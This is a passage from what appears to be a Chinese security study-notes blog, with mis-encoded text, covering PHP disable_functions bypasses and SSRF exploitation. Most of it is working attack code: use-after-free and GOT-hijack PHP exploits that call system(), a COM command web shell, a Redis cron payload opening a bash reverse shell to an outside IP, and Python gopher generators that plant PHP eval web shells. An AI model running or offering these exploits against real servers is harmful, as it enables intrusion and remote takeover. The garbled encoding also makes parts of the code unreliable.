$fake_bkt_off); for($i = 0; $i 12; $i++) $this-write($this-abc, $fake_bkt_off + 0x70 + $i * 8, $this-leak2($function_zval, $i * 8)); # pwn $this-write($this-abc, $fake_bkt_off + 0x70 + 0x30, $zif_system); $this-write($this-abc, $fake_bkt_off, $fake_bkt_addr + 0x70); $spl1-offsetGet($cmd); exit(); $y = [new Z()];json_encode([$y]); ä¿å­˜ä¸ºphpä¸Šä¼ åˆ°vartmp æ–‡ä»¶åŒ…å«å³å¯ Backtrace UAFä½¿ç”¨æ¡ä»¶ï¼š Linux æ“ä½œç³»ç»Ÿ PHP7.0 - all versions to date PHP7.1 - all versions to date PHP7.2 - all versions to date PHP7.3 7.3.15 (released 20 Feb 2020) PHP7.4 7.4.3 (released 20 Feb 2020) æ”»å‡»expï¼š ?php# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)## Bug: https://bugs.php.net/bug.php?id=76047# debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability.## This exploit should work on all PHP 7.0-7.4 versions# released as of 30/01/2020.## Author: https://github.com/mm0r1pwn(uname -a);function pwn($cmd) global $abc, $helper, $backtrace; class Vuln public $a; public function __destruct() global $backtrace; unset($this-a); $backtrace = (new Exception)-getTrace(); # ;) if(!isset($backtrace[1][args])) # PHP = 7.4 $backtrace = debug_backtrace(); class Helper public $a, $b, $c, $d; function str2ptr($str, $p = 0, $s = 8) $address = 0; for($j = $s-1; $j = 0; $j--) $address = 8; $address |= ord($str[$p+$j]); return $address; function ptr2str($ptr, $m = 8) $out = ; for ($i=0; $i $m; $i++) $out .= chr($ptr 0xff); $ptr = 8; return $out; function write($str, $p, $v, $n = 8) $i = 0; for($i = 0; $i $n; $i++) $str[$p + $i] = chr($v 0xff); $v = 8; function leak($addr, $p = 0, $s = 8) global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak = strlen($helper-a); if($s != 8) $leak %= 2 ($s * 8) - 1; return $leak; function parse_elf($base) $e_type = leak($base, 0x10, 2); $e_phoff = leak($base, 0x20); $e_phentsize = leak($base, 0x36, 2); $e_phnum = leak($base, 0x38, 2); for($i = 0; $i $e_phnum; $i++) $header = $base + $e_phoff + $i * $e_phentsize; $p_type = leak($header, 0, 4); $p_flags = leak($header, 4, 4); $p_vaddr = leak($header, 0x10); $p_memsz = leak($header, 0x28); if($p_type == 1 $p_flags == 6) # PT_LOAD, PF_Read_Write # handle pie $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr; $data_size = $p_memsz; else if($p_type == 1 $p_flags == 5) # PT_LOAD, PF_Read_exec $text_size = $p_memsz; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; function get_basic_funcs($base, $elf) list($data_addr, $text_size, $data_size) = $elf; for($i = 0; $i $data_size / 8; $i++) $leak = leak($data_addr, $i * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # constant constant check if($deref != 0x746e6174736e6f63) continue; else continue; $leak = leak($data_addr, ($i + 4) * 8); if($leak - $base 0 $leak - $base $data_addr - $base) $deref = leak($leak); # bin2hex constant check if($deref != 0x786568326e6962) continue; else continue; return $data_addr + $i * 8; function get_binary_base($binary_leak) $base = 0; $start = $binary_leak 0xfffffffffffff000; for($i = 0; $i 0x1000; $i++) $addr = $start - 0x1000 * $i; $leak = leak($addr, 0, 7); if($leak == 0x10102464c457f) # ELF header return $addr; function get_system($basic_funcs) $addr = $basic_funcs; do $f_entry = leak($addr); $f_name = leak($f_entry, 0, 6); if($f_name == 0x6d6574737973) # system return leak($addr + 8); $addr += 0x20; while($f_entry != 0); return false; function trigger_uaf($arg) # str_shuffle prevents opcache string interning $arg = str_shuffle(str_repeat(A, 79)); $vuln = new Vuln(); $vuln-a = $arg; if(stristr(PHP_OS, WIN)) die(This PoC is for *nix systems only.); $n_alloc = 10; # increase this value if UAF fails $contiguous = []; for($i = 0; $i $n_alloc; $i++) $contiguous[] = str_shuffle(str_repeat(A, 79)); trigger_uaf(x); $abc = $backtrace[1][args][0]; $helper = new Helper; $helper-b = function ($x) ; if(strlen($abc) == 79 || strlen($abc) == 0) die(UAF failed); # leaks $closure_handlers = str2ptr($abc, 0); $php_heap = str2ptr($abc, 0x58); $abc_addr = $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj = str2ptr($abc, 0x20); $binary_leak = leak($closure_handlers, 8); if(!($base = get_binary_base($binary_leak))) die(Couldnt determine binary base address); if(!($elf = parse_elf($base))) die(Couldnt parse ELF header); if(!($basic_funcs = get_basic_funcs($base, $elf))) die(Couldnt get basic_functions address); if(!($zif_system = get_system($basic_funcs))) die(Couldnt get zif_system address); # fake closure object $fake_obj_offset = 0xd0; for($i = 0; $i 0x110; $i += 8) write($abc, $fake_obj_offset + $i, leak($closure_obj, $i)); # pwn write($abc, 0x20, $abc_addr + $fake_obj_offset); write($abc, 0xd0 + 0x38, 1, 4); # internal func type write($abc, 0xd0 + 0x68, $zif_system); # internal func handler ($helper-b)($cmd); exit(); antswordä¹Ÿæœ‰æ’ä»¶ labså¯ä»¥å¤ç°è¿™ä¸ªæ¼æ´ concat operation UAFåŠ«æŒgotè¡¨ä½¿ç”¨æ¡ä»¶ï¼š nginx-1.18ä¸‹ï¼šphp5.5,php5.4,php5.3,php5.2æ˜¯å¯ä»¥çš„ php5.6åŠä»¥ä¸Šä¼šå‡ºç° fopen(procselfmem): failed to open stream: Permission denied apache2.4ä¸‹ï¼šphp5.5,php5.4,php5.3æ˜¯å¯ä»¥çš„ php5.6åŠä»¥ä¸Šä¼šå‡ºç° fopen(procselfmem): failed to open stream: Permission denied æ¦‚å¿µä»¥åŠæ”»å‡»åŸç†ï¼š å‚è€ƒhttps://cloud.tencent.com/developer/article/2318123 åœ¨åŠ¨æ€é“¾æ¥çš„æƒ…å†µä¸‹ï¼Œç¨‹åºåŠ è½½çš„æ—¶å€™å¹¶ä¸ä¼šæŠŠé“¾æ¥åº“ä¸­æ‰€æœ‰å‡½æ•°éƒ½ä¸€èµ·åŠ è½½è¿›æ¥ï¼Œè€Œæ˜¯ç¨‹åºæ‰§è¡Œçš„æ—¶å€™æŒ‰éœ€åŠ è½½ï¼Œå¦‚æœæœ‰å‡½æ•°å¹¶æ²¡æœ‰è¢«è°ƒç”¨ï¼Œé‚£ä¹ˆå®ƒå°±ä¸ä¼šåœ¨ç¨‹åºç”Ÿå‘½ä¸­è¢«åŠ è½½è¿›æ¥ã€‚ç®€å•è¯´å°±æ˜¯ï¼Œå‡½æ•°ç¬¬ä¸€æ¬¡ç”¨åˆ°çš„æ—¶å€™æ‰ä¼šæŠŠåœ¨è‡ªå·±çš„çœŸå®åœ°å€ç»™å†™åˆ°ç›¸åº”çš„gotè¡¨é‡Œï¼Œæ²¡ç”¨åˆ°å°±ä¸ç»‘å®šäº†ã€‚è¿™å°±æ˜¯å»¶è¿Ÿç»‘å®šï¼Œç”±äºè¿™ä¸ªæœºåˆ¶ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°çš„æ—¶å€™ï¼Œgotè¡¨ä¸­â€œå­˜æ”¾â€çš„åœ°å€ä¸æ˜¯å‡½æ•°çš„çœŸå®åœ°å€ï¼Œè€Œæ˜¯plt è¡¨ä¸­çš„ç¬¬äºŒæ¡æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¥ä¸‹æ¥ä¼šè¿›è¡Œä¸€ç³»åˆ—æ“ä½œè£…è½½ç›¸åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼Œå°†å‡½æ•°çš„çœŸå®åœ°å€å†™åœ¨gotè¡¨ä¸­ã€‚ä»¥åè°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œgotè¡¨ä¿å­˜ç€å…¶çœŸå®åœ°å€ã€‚è¿™é‡ŒåŠ«æŒgotè¡¨å°±æ˜¯ä¿®æ”¹å‡½æ•°çš„gotè¡¨çš„åœ°å€çš„å†…å®¹ä¸ºæˆ‘ä»¬çš„shellcodeçš„åœ°å€step 1:é€šè¿‡phpè„šæœ¬è§£æ/proc/self/exeå¾—åˆ°openå‡½æ•°çš„gotè¡¨çš„åœ°å€ã€‚step 2:é€šè¿‡è¯»å–/proc/self/mapså¾—åˆ°ç¨‹åºåŸºåœ°å€ï¼Œæ ˆåœ°å€ï¼Œä¸libcåŸºåœ°å€ã€‚step 3:é€šè¿‡phpè„šæœ¬è§£ælibcå¾—åˆ°systemå‡½æ•°çš„åœ°å€ï¼Œç»“åˆlibcåŸºåœ°å€ï¼ˆä¸¤è€…ç›¸åŠ ï¼‰å¯ä»¥å¾—åˆ°systemå‡½æ•°çš„å®é™…åœ°å€ã€‚step 4:é€šè¿‡è¯»å†™/proc/self/memå®ç°ä¿®æ”¹openå‡½æ•°çš„gotè¡¨çš„åœ°å€çš„å†…å®¹ä¸ºæˆ‘ä»¬çš„shellcodeçš„åœ°å€ã€‚å‘æˆ‘ä»¬æŒ‡å®šçš„shellcodeçš„åœ°å€å†™å…¥æˆ‘ä»¬çš„shellcodeã€‚ expï¼ˆå‘½ä»¤æ— å›æ˜¾ï¼Œå¦‚æœæ²¡æœ‰æƒé™è¯»å†™procselfmemï¼Œè‡ªç„¶ä¹Ÿå°±æ— æ³•åˆ©ç”¨äº†ï¼‰ step1:é€šè¿‡phpè„šæœ¬è§£æprocselfexeå¾—åˆ°openå‡½æ•°çš„gotè¡¨çš„åœ°å€ step 2:é€šè¿‡è¯»å–procselfmapså¾—åˆ°ç¨‹åºåŸºåœ°å€ï¼Œæ ˆåœ°å€ï¼Œä¸libcåŸºåœ°å€ã€‚ step 3:é€šè¿‡phpè„šæœ¬è§£ælibcå¾—åˆ°systemå‡½æ•°çš„åœ°å€ï¼Œç»“åˆlibcåŸºåœ°å€ï¼ˆä¸¤è€…ç›¸åŠ ï¼‰å¯ä»¥å¾—åˆ°systemå‡½æ•°çš„å®é™…åœ°å€ã€‚ step 4:é€šè¿‡è¯»å†™procselfmemå®ç°ä¿®æ”¹openå‡½æ•°çš„gotè¡¨çš„åœ°å€çš„å†…å®¹ä¸ºæˆ‘ä»¬çš„shellcodeçš„åœ°å€ã€‚å‘æˆ‘ä»¬æŒ‡å®šçš„shellcodeçš„åœ°å€å†™å…¥æˆ‘ä»¬çš„shellcodeã€‚ æ€»è€Œè¨€ä¹‹å°±æ˜¯ä¿®æ”¹gotè¡¨çš„åœ°å€ï¼Œä¿®æ”¹å…¶ä¸ºæˆ‘ä»¬shellcodeçš„åœ°å€ã€‚ expï¼š ?php /*** ** BUGä¿®æ­£è¯·è”ç³»æˆ‘* @author* @email xiaozeend@pm.me **//*section tables type*/define(SHT_NULL,0);define(SHT_PROGBITS,1);define(SHT_SYMTAB,2);define(SHT_STRTAB,3);define(SHT_RELA,4);define(SHT_HASH,5);define(SHT_DYNAMIC,6);define(SHT_NOTE,7);define(SHT_NOBITS,8);define(SHT_REL,9);define(SHT_SHLIB,10);define(SHT_DNYSYM,11);define(SHT_INIT_ARRAY,14);define(SHT_FINI_ARRAY,15);//why does section tables have so many fuck typedefine(SHT_GNU_HASH,0x6ffffff6);define(SHT_GNU_versym,0x6fffffff);define(SHT_GNU_verneed,0x6ffffffe);class elf private $elf_bin; private $strtab_section=array(); private $rel_plt_section=array(); private $dynsym_section=array(); public $shared_librarys=array(); public $rel_plts=array(); public function getElfBin() return $this-elf_bin; public function setElfBin($elf_bin) $this-elf_bin = fopen($elf_bin,rb); public function unp($value) return hexdec(bin2hex(strrev($value))); public function get($start,$len) fseek($this-elf_bin,$start); $data=fread ($this-elf_bin,$len); rewind($this-elf_bin); return $this-unp($data); public function get_section($elf_bin=) if ($elf_bin) $this-setElfBin($elf_bin); $this-elf_shoff=$this-get(0x28,8); $this-elf_shentsize=$this-get(0x3a,2); $this-elf_shnum=$this-get(0x3c,2); $this-elf_shstrndx=$this-get(0x3e,2); for ($i=0;$i$this-elf_shnum;$i+=1) $sh_type=$this-get($this-elf_shoff+$i*$this-elf_shentsize+4,4); switch ($sh_type) case SHT_STRTAB: $this-strtab_section[$i]= array( strtab_offset=$this-get($this-elf_shoff+$i*$this-elf_shentsize+24,8), strtab_size=$this-strtab_size=$this-get($this-elf_shoff+$i*$this-elf_shentsize+32,8) ); break; case SHT_RELA: $this-rel_plt_section[$i]= array( rel_plt_offset=$this-get($this-elf_shoff+$i*$this-elf_shentsize+24,8), rel_plt_size=$this-strtab_size=$this-get($this-elf_shoff+$i*$this-elf_shentsize+32,8), rel_plt_entsize=$this-get($this-elf_shoff+$i*$this-elf_shentsize+56,8) ); break; case SHT_DNYSYM: $this-dynsym_section[$i]= array( dynsym_offset=$this-get($this-elf_shoff+$i*$this-elf_shentsize+24,8), dynsym_size=$this-strtab_size=$this-get($this-elf_shoff+$i*$this-elf_shentsize+32,8), dynsym_entsize=$this-get($this-elf_shoff+$i*$this-elf_shentsize+56,8) ); break; case SHT_NULL: case SHT_PROGBITS: case SHT_DYNAMIC: case SHT_SYMTAB: case SHT_NOBITS: case SHT_NOTE: case SHT_FINI_ARRAY: case SHT_INIT_ARRAY: case SHT_GNU_versym: case SHT_GNU_HASH: break; default: // echo who knows what $sh_type this is? ; public function get_reloc() $rel_plts=array(); $dynsym_section= reset($this-dynsym_section); $strtab_section=reset($this-strtab_section); foreach ($this-rel_plt_section as $rel_plt ) for ($i=$rel_plt[rel_plt_offset];$i$rel_plt[rel_plt_offset]+$rel_plt[rel_plt_size];$i+=$rel_plt[rel_plt_entsize]) $rel_offset=$this-get($i,8); $rel_info=$this-get($i+8,8)32; $fun_name_offset=$this-get($dynsym_section[dynsym_offset]+$rel_info*$dynsym_section[dynsym_entsize],4); $fun_name_offset=$strtab_section[strtab_offset]+$fun_name_offset-1; $fun_name=; while ($this-get(++$fun_name_offset,1)!=) $fun_name.=chr($this-get($fun_name_offset,1)); $rel_plts[$fun_name]=$rel_offset; $this-rel_plts=$rel_plts; public function get_shared_library($elf_bin=) if ($elf_bin) $this-setElfBin($elf_bin); $shared_librarys=array(); $dynsym_section=reset($this-dynsym_section); $strtab_section=reset($this-strtab_section); for($i=$dynsym_section[dynsym_offset]+$dynsym_section[dynsym_entsize];$i$dynsym_section[dynsym_offset]+$dynsym_section[dynsym_size];$i+=$dynsym_section[dynsym_entsize]) $shared_library_offset=$this-get($i+8,8); $fun_name_offset=$this-get($i,4); $fun_name_offset=$fun_name_offset+$strtab_section[strtab_offset]-1; $fun_name=; while ($this-get(++$fun_name_offset,1)!=) $fun_name.=chr($this-get($fun_name_offset,1)); $shared_librarys[$fun_name]=$shared_library_offset; $this-shared_librarys=$shared_librarys; public function close() fclose($this-elf_bin); public function __destruct() $this-close(); public function packlli($value) $higher = ($value 0xffffffff00000000) 32; $lower = $value 0x00000000ffffffff; return pack(V2, $lower, $higher); $test=new elf();$test-get_section(/proc/self/exe);$test-get_reloc(); // è·å¾—å„å‡½æ•°çš„gotè¡¨çš„åœ°å€$open_php=$test-rel_plts[open];$maps = file_get_contents(/proc/self/maps);preg_match(/(\\w+)-(\\w+)\\s+.+\\[stack]/, $maps, $stack);preg_match(/(\\w+)-(\\w+).*?libc-/,$maps,$libcgain);$libc_base = 0x.$libcgain[1];echo Libc base: .$libc_base. ;echo Stack location: .$stack[1]. ;$array_tmp = explode(-,$maps);$pie_base = hexdec(0x.$array_tmp[0]);echo PIE base: .$pie_base. ;$test2=new elf();$test2-get_section(/usr/lib64/libc-2.17.so);$test2-get_reloc();$test2-get_shared_library(); // è§£ælibcåº“ï¼Œå¾—åˆ°libcåº“å‡½æ•°çš„ç›¸å¯¹åœ°å€$sys = $test2-shared_librarys[system];$sys_addr = $sys + hexdec($libc_base);echo system addr:.$sys_addr. ;$mem = fopen(/proc/self/mem,wb);$shellcode_loc = $pie_base + 0x2333;fseek($mem,$open_php);fwrite($mem,$test-packlli($shellcode_loc));$command=$_GET[cmd]; // æˆ‘ä»¬è¦æ‰§è¡Œçš„å‘½ä»¤$stack=hexdec(0x.$stack[1]);fseek($mem, $stack);fwrite($mem, $command\\x00);$cmd = $stack;$shellcode = H\\xbf.$test-packlli($cmd).H\\xb8.$test-packlli($sys_addr).P\\xc3;fseek($mem,$shellcode_loc);fwrite($mem,$shellcode);readfile(zxhy);// highlight_file(zxhy);// show_source(zxhy);// file_get_contents(zxhy);exit(); Windows ç»„ä»¶ COMä½¿ç”¨æ¡ä»¶ï¼š å¼€å¯com.allow_dcom åˆ›å»ºä¸€ä¸ªCOMå¯¹è±¡,é€šè¿‡è°ƒç”¨COMå¯¹è±¡çš„execæ›¿æˆ‘ä»¬æ‰§è¡Œå‘½ä»¤ ?php$wsh = isset($_GET[wsh]) ? $_GET[wsh] : wscript;if($wsh == wscript) $command = $_GET[cmd]; $wshit = new COM(WScript.shell) or die(Create Wscript.Shell Failed!); $exec = $wshit-exec(cmd /c.$command); $stdout = $exec-StdOut(); $stroutput = $stdout-ReadAll(); echo $stroutput;elseif($wsh == application) $command = $_GET[cmd]; $wshit = new COM(Shell.Application) or die(Shell.Application Failed!); $exec = $wshit-ShellExecute(cmd,/c .$command); else echo(0);? ä¸Šä¼ è®¿é—®æ‰§è¡Œå‘½ä»¤å³å¯","tags":["Study-Note"]},{"title":"SSRF","path":"/2025/08/29/SSRF/","content":"SSRFæ¦‚å¿µSSRF(Server-Side Request Forgery)ï¼Œå³æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼Œåˆ©ç”¨æ¼æ´ä¼ªé€ æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚ï¼Œä»è€Œçªç ´å®¢æˆ·ç«¯è·å–ä¸åˆ°æ•°æ®é™åˆ¶ï¼Œæœ¬è´¨ä¸Šæ˜¯å±äºä¿¡æ¯æ³„éœ²æ¼æ´ã€‚ æ¼æ´åŸç†æœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ä¸”æ²¡æœ‰å¯¹åœ°å€å’Œåè®®ç­‰åšè¿‡æ»¤å’Œé™åˆ¶ï¼Œæ¯”å¦‚ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹ï¼ŒåŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½ç­‰ç­‰ï¼Œè€Œä¸”åœ¨å¤§éƒ¨åˆ†çš„webæœåŠ¡å™¨æ¶æ„ä¸­ï¼ŒwebæœåŠ¡å™¨è‡ªèº«æ˜¯å¯ä»¥è®¿é—®äº’è”ç½‘å’ŒæœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘çš„ï¼Œæ‰€ä»¥æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚,å¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®ã€‚ å¸¸è§æ¼æ´å‡½æ•°file_get_contents()curl_exec()fsockopen()fopen()åè®®http(s):åŸºç¡€http://target.com/fetch?url=http://internal-service/adminhttps://target.com/fetch?url=https://internal-service/config å‡çº§1.HTTPé‡å®šå‘ # è®¾ç½®ä¸€ä¸ªé‡å®šå‘åˆ°å†…éƒ¨æœåŠ¡çš„å¤–éƒ¨æœåŠ¡http://target.com/fetch?url=http://attacker.com/redirect# attacker.comè¿”å›302é‡å®šå‘åˆ°http://internal-service/ 2.HTTPè¯·æ±‚èµ°ç§ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯ä»¥åœ¨HTTPè¯·æ±‚ä¸­åµŒå…¥é¢å¤–çš„HTTPè¯·æ±‚ http://target.com/fetch?url=http://external-service/X-Forwarded-For: internal-service 3.HTTPè®¤è¯ http://target.com/fetch?url=http://user:password@internal-service/ file:è®¿é—®æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ 1.è·¯å¾„éå† http://target.com/fetch?url=file:///var/www/html/../../../etc/shadow 2.ç‰¹æ®Šæ–‡ä»¶ http://target.com/fetch?url=file:///proc/self/environhttp://target.com/fetch?url=file:///proc/self/cmdline 3.åˆ—ç›®å½• æŸäº›æƒ…å†µä¸‹å¯ç”¨ http://target.com/fetch?url=file:///var/www/html/ dict:dictåè®®æ˜¯ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®ï¼Œé€šå¸¸ç”¨äºè®©å®¢æˆ·ç«¯ä½¿ç”¨è¿‡ç¨‹ä¸­èƒ½å¤Ÿè®¿é—®æ›´å¤šçš„å­—å…¸æºï¼Œä½†æ˜¯åœ¨SSRFä¸­å¦‚æœå¯ä»¥ä½¿ç”¨dictåè®®é‚£ä¹ˆå°±å¯ä»¥è½»æ˜“çš„è·å–ç›®æ ‡æœåŠ¡å™¨ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ç‰ˆæœ¬ç­‰ä¿¡æ¯ã€‚ 1.Rediså‘½ä»¤æ‰§è¡Œï¼šåˆ©ç”¨dictåè®®ä¸RedisæœåŠ¡äº¤äº’ 2.Memcachedæ•°æ®æå–ï¼šè®¿é—®MemcachedæœåŠ¡è·å–ç¼“å­˜æ•°æ®ã€‚ gopher:å¾ˆå¼ºå¤§çš„åè®®ï¼Œåœ¨SSRFä¸­ç»å¸¸ä¼šä½¿ç”¨Gopheræ¥æ„é€ GETPOSTåŒ…æ”»å‡»åº”ç”¨ã€‚åˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ FTPã€Telnetã€Redisã€Memcacheã€‚ ftp:ç”¨äºä¸FTPæœåŠ¡å™¨äº¤äº’ http://target.com/fetch?url=ftp://user:pass@192.168.1.10/ Bypassåˆ©ç”¨[::]http://[::]:80/ http://127.0.0.1 åˆ©ç”¨@http://example.com@127.0.0.1 åˆ©ç”¨çŸ­åœ°å€http://dwz.cn/11SMa http://127.0.0.1 åˆ©ç”¨302è·³è½¬è‡ªå·±æœåŠ¡å™¨ä¸Švimä¸€ä¸ªindex.php ?phpheader(Location:http://127.0.0.1/flag.php); ç„¶åpayloadè®¿é—®è‡ªå·±è¿™ä¸ªåœ°å€å°±å¯ä»¥äº†ã€‚ åˆ©ç”¨DNSé‡ç»‘å®šDNS é‡ç»‘å®šæ˜¯ä¸€ç§ç‰¹å®šçš„æŠ€æœ¯ï¼Œé€šå¸¸ç”¨äºç»•è¿‡ åŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰ã€‚æ”»å‡»è€…ä¼šé€šè¿‡æ“æ§ DNS è§£æè¿‡ç¨‹ï¼Œä¼ªè£…è‡ªå·±çš„åŸŸåï¼Œä½¿å…¶è§£æåˆ°å—å®³è€…çš„å†…ç½‘ IPï¼ˆä¾‹å¦‚ 127.0.0.1 æˆ– 192.168.x.xï¼‰æˆ–äº‘æœåŠ¡åœ°å€ã€‚è¿™æ ·ï¼Œæ”»å‡»è€…ä¾¿èƒ½åˆ©ç”¨æ­¤æŠ€æœ¯æ”»å‡»ç›®æ ‡ç½‘ç»œï¼Œæ‰§è¡Œå¤šç§æ¼æ´åˆ©ç”¨æ–¹å¼ å‚è€ƒæ–‡ç« é€šè¿‡ DNS é‡ç»‘å®šçš„ SSRF æ”»å‡»å†…éƒ¨äº‘æœåŠ¡_dns rebinding-CSDNåšå®¢ https://lock.cmpxchg8b.com/rebinder.html åˆ©ç”¨è¿›åˆ¶è½¬æ¢å…«è¿›åˆ¶ åœ¨è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶ http://0177.0000.0000.0001 åè¿›åˆ¶ http://2130706433 åå…­è¿›åˆ¶ è®¿é—®åŠ 0x http://0x7f000001 åˆ©ç”¨ç‰¹æ®Šåœ°å€http://0/http://0.0.0.0http://127.0000000000000.001/flag.phphttp://127.1/flag.php åˆ©ç”¨å¥å·ç»•è¿‡http://127ã€‚0ã€‚0ã€‚1/flag.php åˆ©ç”¨IPv6æœ‰äº›æœåŠ¡æ²¡æœ‰è€ƒè™‘IPv6çš„æƒ…å†µï¼Œä½†æ˜¯å†…ç½‘åˆæ”¯æŒIPv6ï¼Œåˆ™å¯ä»¥ä½¿ç”¨IPv6çš„æœ¬åœ°IPå¦‚ [::] 0000::1 æˆ–IPv6çš„å†…ç½‘åŸŸåæ¥ç»•è¿‡è¿‡æ»¤ã€‚ åˆ©ç”¨IDNä¸€äº›ç½‘ç»œè®¿é—®å·¥å…·å¦‚Curlç­‰æ˜¯æ”¯æŒå›½é™…åŒ–åŸŸåï¼ˆInternationalized Domain Nameï¼ŒIDNï¼‰çš„ï¼Œå›½é™…åŒ–åŸŸååˆç§°ç‰¹æ®Šå­—ç¬¦åŸŸåï¼Œæ˜¯æŒ‡éƒ¨åˆ†æˆ–å®Œå…¨ä½¿ç”¨ç‰¹æ®Šçš„æ–‡å­—æˆ–å­—æ¯ç»„æˆçš„äº’è”ç½‘åŸŸåã€‚åœ¨è¿™äº›å­—ç¬¦ä¸­ï¼Œéƒ¨åˆ†å­—ç¬¦ä¼šåœ¨è®¿é—®æ—¶åšä¸€ä¸ªç­‰ä»·è½¬æ¢ï¼Œä¾‹å¦‚ â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ å’Œ example.com ç­‰åŒã€‚åˆ©ç”¨è¿™ç§æ–¹å¼ï¼Œå¯ä»¥ç”¨ â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© ç­‰å­—ç¬¦ç»•è¿‡å†…ç½‘é™åˆ¶ã€‚ ç»•è¿‡ç‰¹å®šç»“å°¾å¼€å¤´?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST[url];$x=parse_url($url);if(preg_match(/^http:\\/\\/ctf\\..*show$/i,$url)) echo file_get_contents($url); url=http://ctf.@127.0.0.1/flag.php#show æ¼æ´åˆ©ç”¨è¯»å–æœ¬åœ°æ–‡ä»¶fileæˆ–è€…load_file file:etcpasswdè¿™ç§ SSRFç»•è¿‡æŠ€å·§æ–‡ç« :https://sauy.top/2025/08/04/SSRF%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/ æ¢æµ‹å†…ç½‘ç«¯å£dict://127.0.0.1:22dict://127.0.0.1:6379/info RedisRedisä¸€èˆ¬éƒ½æ˜¯ç»‘å®šåœ¨6379ç«¯å£.å¦‚æœæ²¡æœ‰è®¾ç½®å£ä»¤ï¼ˆé»˜è®¤æ˜¯æ— ),æ”»å‡»è€…å°±å¯ä»¥é€šè¿‡SSRFæ¼æ´æœªæˆæƒè®¿é—®å†…ç½‘Redis æœªæˆæƒ1.å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell burpé‡Œæ“ä½œ # æ¸…ç©º keydict://172.72.23.27:6379/flushall# è®¾ç½®è¦æ“ä½œçš„è·¯å¾„ä¸ºå®šæ—¶ä»»åŠ¡ç›®å½•dict://172.72.23.27:6379/config set dir /var/spool/cron/# åœ¨å®šæ—¶ä»»åŠ¡ç›®å½•ä¸‹åˆ›å»º root çš„å®šæ—¶ä»»åŠ¡æ–‡ä»¶dict://172.72.23.27:6379/config set dbfilename root# å†™å…¥ Bash åå¼¹ shell çš„ payloaddict://172.72.23.27:6379/set x * * * * * /bin/bash -i %26 /dev/tcp/47.109.207.123/2333 0%261 # ä¿å­˜ä¸Šè¿°æ“ä½œdict://172.72.23.27:6379/save 2.gopher import urllib.parseprotocol = gopher://ip = 172.72.23.27port = 6779shell = ?php eval($_POST[\\f4ke\\]);? filename = 5he1l.phppath = /var/www/htmlpasswd = cmd = [flushall, set 1 .format(shell.replace( ,$IFS)), config set dir .format(path), config set dbfilename .format(filename), save, quit ]if passwd: cmd.insert(0,AUTH .format(passwd))payload = protocol + ip + : + port + /_def redis_format(arr): CRLF = \\r redis_arr = arr.split( ) cmd = cmd += * + str(len(redis_arr)) for x in redis_arr: cmd += CRLF + $ + str(len((x.replace($IFS, )))) + CRLF + x.replace($IFS, ) cmd += CRLF return cmdif __name__==__main__: for x in cmd: payload += urllib.parse.quote(redis_format(x)) # print(payload) print(urllib.parse.quote(payload)) å¼±è®¤è¯url=dict://172.72.23.28:6379/auth P@ssw0rd ä½¿ç”¨è„šæœ¬ import urllib.parseprotocol = gopher://ip = 172.72.23.28port = 6379shell = ?php eval($_GET[1]);? filename = 2333.phppath = /var/www/htmlpasswd = P@ssw0rd# Redis å‘½ä»¤é“¾ï¼ˆæ¯ä¸ªå‘½ä»¤æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œä¸è¦æ‹¼æˆå­—ç¬¦ä¸²ï¼‰cmd = [ [flushall], [set, x, shell], [config, set, dir, path], [config, set, dbfilename, filename], [save], [quit]]# å¦‚æœéœ€è¦å¯†ç éªŒè¯if passwd: cmd.insert(0, [AUTH, passwd])def redis_format(arr): CRLF = \\r cmd = * + str(len(arr)) + CRLF for arg in arr: cmd += $ + str(len(arg)) + CRLF + arg + CRLF return cmdif __name__ == __main__: payload = protocol + ip + : + port + /_ for x in cmd: payload += urllib.parse.quote(redis_format(x)) print(payload) ç„¶å url=http://172.72.23.28/2333.php?1=system(ls); æ‰§è¡Œå‘½ä»¤å³å¯ MYSQLæŸ¥è¯¢æ•°æ®MySQL éœ€è¦å¯†ç è®¤è¯æ—¶ï¼ŒæœåŠ¡å™¨å…ˆå‘é€ salt ç„¶åå®¢æˆ·ç«¯ä½¿ç”¨ salt åŠ å¯†å¯†ç ç„¶åéªŒè¯ï¼›ä½†æ˜¯å½“æ— éœ€å¯†ç 